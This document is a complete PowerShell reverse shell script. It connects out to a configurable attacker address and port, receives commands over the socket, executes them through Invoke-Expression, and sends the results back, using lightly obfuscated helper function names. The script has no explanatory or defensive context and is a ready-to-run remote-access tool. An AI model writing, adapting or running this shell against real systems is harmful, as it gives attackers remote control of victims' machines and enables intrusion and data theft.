$srvAddr = "192.168.0.100" #Change this!!!!!!!!!!
$srvPort = 4444 #Change this!!!!!!!!!!
$bufSz   = 1024

function f1 {
    param([System.Net.Sockets.TcpClient]$c)
    return $c.GetStream()
}

function f2 {
    param([System.IO.Stream]$s, [System.Byte[]]$b)
    return $s.Read($b, 0, $b.Length)
}

function f3 {
    param([System.IO.StreamWriter]$w, [string]$d)
    $w.Write("$d`n")
}

$cli = New-Object System.Net.Sockets.TcpClient($srvAddr, $srvPort)
$nst = f1 -c $cli
$rdr = New-Object System.IO.StreamReader($nst)
$wtr = New-Object System.IO.StreamWriter($nst)
$wtr.AutoFlush = $true
$buf = New-Object System.Byte[] $bufSz

while ($cli.Connected) {
    while ($nst.DataAvailable) {
        $raw = f2 -s $nst -b $buf
        if ($raw -gt 0) {
            $cmd = ([System.Text.Encoding]::UTF8).GetString($buf, 0, $raw)
        }
    }
    if ($cli.Connected -and $cmd.Length -gt 1) {
        $out = try { Invoke-Expression ($cmd) 2>&1 } catch { $_ }
        f3 -w $wtr -d $out
        $cmd = $null
    }
}

$cli.Close()
$nst.Close()
$rdr.Close()
$wtr.Close()